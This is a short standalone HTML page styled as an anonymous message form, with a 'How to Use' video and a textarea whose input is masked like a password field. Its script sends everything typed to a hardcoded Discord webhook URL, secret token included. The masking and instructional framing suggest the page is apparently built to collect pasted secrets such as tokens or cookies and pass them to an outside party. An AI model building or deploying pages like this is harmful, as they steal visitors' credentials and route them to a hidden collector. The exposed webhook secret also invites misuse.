<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Submit Message</title>

<style>
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    min-height: 100vh;
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    background-size: 400% 400%;
    animation: bgMove 15s ease infinite;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #eaeaea;
  }

  @keyframes bgMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .card {
    width: 380px;
    background: rgba(0, 0, 0, 0.45);
    border-radius: 16px;
    padding: 24px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
    animation: fadeIn 0.8s ease;
  }

  @keyframes fadeIn {
    from {
      opacity: 0;
      transform: translateY(15px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  h2 {
    text-align: center;
    margin-bottom: 16px;
    font-weight: 600;
  }

  .video-wrapper {
    width: 100%;
    aspect-ratio: 16 / 9;
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 16px;
  }

  iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  textarea {
    width: 100%;
    height: 100px;
    padding: 12px;
    border-radius: 10px;
    border: none;
    outline: none;
    resize: none;
    font-size: 14px;
    background: #111;
    color: #fff;
    transition: box-shadow 0.2s ease, transform 0.2s ease;

    /* hide text like password */
    -webkit-text-security: disc;
    -moz-text-security: disc;
  }

  textarea:focus {
    transform: scale(1.02);
    box-shadow: 0 0 0 2px rgba(0, 180, 255, 0.6);
  }

  button {
    margin-top: 14px;
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: none;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    color: white;
    background: linear-gradient(135deg, #00b4ff, #4facfe);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
  }

  button:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(0, 180, 255, 0.5);
  }

  button:active {
    transform: translateY(0);
    box-shadow: 0 5px 10px rgba(0,0,0,0.4);
  }

  .footer {
    margin-top: 10px;
    text-align: center;
    font-size: 12px;
    opacity: 0.7;
  }
</style>
</head>

<body>

<div class="card">
  <h2>How to Use</h2>

  <div class="video-wrapper">
    <iframe
      src="https://www.youtube.com/embed/v=yfYV-BYasVI"
      allowfullscreen>
    </iframe>
  </div>

  <textarea id="message" placeholder="Type your message here"></textarea>

  <button onclick="sendMessage()">Send</button>

  <div class="footer">
    Simple • Fast • Anonymous
  </div>
</div>

<script>
  const MAX_LENGTH = 1999;

  async function sendMessage() {
    const message = document.getElementById('message').value;
    if (!message) {
      alert("Please type something!");
      return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";

    const chunks = [];
    for (let i = 0; i < message.length; i += MAX_LENGTH) {
      chunks.push(message.substring(i, i + MAX_LENGTH));
    }

    try {
      for (let chunk of chunks) {
        const response = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: chunk })
        });

        if (!response.ok) {
          alert("Failed to send message.");
          return;
        }
      }

      alert("Message sent!");
      document.getElementById('message').value = "";
    } catch (error) {
      alert("Error: " + error);
    }
  }
</script>

</body>
</html>
